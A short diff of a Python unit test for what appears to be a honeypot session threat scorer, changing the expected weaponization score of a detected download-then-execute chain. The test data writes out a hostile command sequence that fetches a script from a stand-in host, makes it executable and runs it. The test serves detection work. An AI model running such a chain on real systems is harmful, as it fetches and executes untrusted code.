@@ -43,7 +43,7 @@ def test_whole_words_only():
 def test_download_then_execute_chain():
     events = [ev("cowrie.login.success", username="root")] + cmds("wget http://x/y.sh", "chmod +x y.sh", "./y.sh")
     r = evaluate_session(events)
-    assert r["dimensions"]["weaponization"] == 25          # 6 download + 15 execute + 5 chain, capped
+    assert r["dimensions"]["weaponization"] == 19          # 6 download + 8 execution + 5 chain
     assert any("Download -> Execute" in e["reason"] for e in r["explanations"])
     assert any(a["severity"] == "CRITICAL" for a in r["alerts"])
     assert r["threatScore"] == 70 and r["riskLevel"] == "CRITICAL"   # confirmed download-to-execution chain
